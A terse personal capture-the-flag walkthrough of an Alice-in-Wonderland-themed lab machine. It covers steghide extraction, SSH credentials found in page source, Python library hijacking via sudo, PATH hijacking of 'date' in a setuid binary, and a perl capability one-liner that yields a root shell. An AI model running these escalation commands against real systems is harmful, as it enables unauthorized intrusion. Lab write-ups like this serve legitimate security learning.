Bsically a ctf-gamified
Initial foothold was when we had to download the white-rabit image and
`steghide extract -sf white-rabbit.jpg` - enter passphrase - press enter, without pass
showed follow r a b b i t, it http://IP/r/a/b/b/i/t - view source showed alice's ssh password
`ssh alice@IP`
there was a python file, which we could run, and the owner was root
It imported random, and sudo -i showed we could run it as the user rabbit
We created a file, `echo "import os; os.system('/bin/bash');" > random.py`
```
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
gave us the user rabbit.
In rabbit's home, there was a teaParty Binary. sent it to kali
`strings teaParty` showed it uses date as a relative path. PATH
```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```
So, created a file, echo "/bin/bash" > date and added the home/rabbit to $PATH
this binary was running as root, but we got the user shell for hatter
In hatter's home, there was a password.txt, with his ssh password
`getcap -r / 2>/dev/null` showed perl had the req capability for gtfo bins to word magic
but it dint work. walkthrough showed it worked
So, quit the ssh with all the escalated accounts

directly ssh hatter@IP and reran the
```

./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
That gave us root shell!